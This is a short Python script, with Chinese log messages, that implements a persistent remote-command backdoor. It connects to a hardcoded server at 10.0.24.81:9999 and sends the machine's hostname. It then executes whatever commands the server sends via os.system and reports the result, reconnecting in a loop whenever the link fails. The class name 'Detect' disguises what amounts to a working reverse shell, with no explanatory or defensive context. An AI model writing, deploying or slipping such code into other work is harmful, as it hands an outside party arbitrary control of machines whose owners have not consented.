#!/usr/bin/env python
import time
import threading
import os
import socket


FLAG = False

class Detect(threading.Thread):
    def __init__(self):
        super().__init__()

    def run(self) -> None:
        global FLAG
        FLAG = True
        try:
            ip_port = ('10.0.24.81', 9999)
            sk = socket.socket()
            sk.connect(ip_port)
            data = sk.recv(1024).decode()
            print('[服务器]:', data)
            sk.sendall(f'{socket.gethostname()}'.encode())
            data = sk.recv(1024).decode()
            sk.sendall('recevie'.encode())
            while True:
                data = sk.recv(1024).decode()
                print('[来自服务器的命令]:', data)
                if data == 'exit':
                    sk.sendall('exit'.encode())
                    sk.close()
                    FLAG = False
                    break
                status = os.system(data)
                if status == 0:
                    status_result = 'success'
                else:
                    status_result = 'fail'
                sk.sendall(f'{status_result}'.encode())
            print('Exit loop')
        except Exception:
            FLAG = False


if __name__ == '__main__':
    while True:
        if FLAG is True:
            print('Sleep 20 seconds')
            time.sleep(20)
        else:
            print('????????')
            Detect().start()
